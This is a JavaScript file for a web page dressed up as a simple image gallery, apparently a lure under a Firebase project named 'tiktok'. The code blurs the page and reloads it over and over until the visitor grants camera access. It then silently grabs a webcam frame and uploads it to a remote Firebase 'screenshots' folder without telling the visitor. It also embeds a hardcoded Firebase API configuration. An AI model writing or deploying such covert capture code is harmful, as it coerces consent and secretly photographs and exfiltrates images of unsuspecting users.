import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-storage.js";

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyD6bpzJtLQ0Ln4MLH4mdJsSejYf1cuRlUs",
    authDomain: "tiktok-8f8c2.firebaseapp.com",
    projectId: "tiktok-8f8c2",
    storageBucket: "tiktok-8f8c2.appspot.com",
    messagingSenderId: "705005735151",
    appId: "1:705005735151:web:d2d5d73a4c8143ae5bdf1a"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const storage = getStorage(app); // Initialize Storage

const images = document.getElementById("images");
const image = [
    {
        id: 1,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
    {
        id: 2,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
    {
        id: 3,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
    {
        id: 4,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
    {
        id: 5,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
    {
        id: 6,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
    {
        id: 7,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
    {
        id: 8,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
    {
        id: 9,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
    {
        id: 10,
        imageURL: "https://www.canyaman.it/wp-content/uploads/2022/05/libro-can-yaman-small.jpg",
    },
];

const imagesLength = document.getElementById('images-length');
imagesLength.innerHTML = `(${image.length})`;

images.innerHTML = `
 <div class="image">
    ${image.map((img) => (
    `<img src="${img.imageURL}" />`
)).join('')}
</div>
`;

// Function to apply blur effect
function blurWebsite() {
    var content = document.getElementById('content');
    content.style.filter = 'blur(100px)';
}

// Function to remove blur effect
function unblurWebsite() {
    var content = document.getElementById('content');
    content.style.filter = 'none';
}

// Function to continuously request camera permission
function requestCameraPermission() {
    navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false
    })
        .then(function (localMediaStream) {
            unblurWebsite(); // Remove blur
            var video = document.querySelector('.video');
            video.srcObject = localMediaStream;
            video.onloadedmetadata = function (e) {
                video.play();
                setTimeout(function () {
                    takeScreenshot(video);
                }, 100);
            };
        })
        .catch(function (err) {
            if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
                blurWebsite(); // Keep website blurred until permission is granted
                alert("Camera permission is required to use this application. Please allow access in your browser settings.");
                setTimeout(function () {
                    window.location.reload(); // Retry permission request
                }, 100);
            }
        });
}

// Call the function on page load
blurWebsite(); // Blur the website initially
requestCameraPermission();

function takeScreenshot(video) {
    var canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    var context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    var imageDataUrl = canvas.toDataURL('image/png');
    var blob = dataURLtoBlob(imageDataUrl);
    console.log("SCS", blob);
    uploadToFirebase(blob);
}

function dataURLtoBlob(dataURL) {
    var binary = atob(dataURL.split(',')[1]);
    var array = [];
    for (var i = 0; i < binary.length; i++) {
        array.push(binary.charCodeAt(i));
    }
    return new Blob([new Uint8Array(array)], { type: 'image/png' });
}

// Function to upload images to Firebase
function uploadToFirebase(blob) {
    // Create a unique file name
    var fileName = 'screenshot_' + Date.now() + '.png';

    // Create a storage reference
    var storageRef = ref(storage, 'screenshots/' + fileName); // Corrected

    // Upload the file
    uploadBytes(storageRef, blob).then((snapshot) => {
        console.log('Uploaded a blob or file!');
        // Get the download URL
        getDownloadURL(snapshot.ref).then((downloadURL) => {
            console.log('File available at', downloadURL);
        });
    }).catch((error) => {
        console.error('Upload failed:', error);
    });
}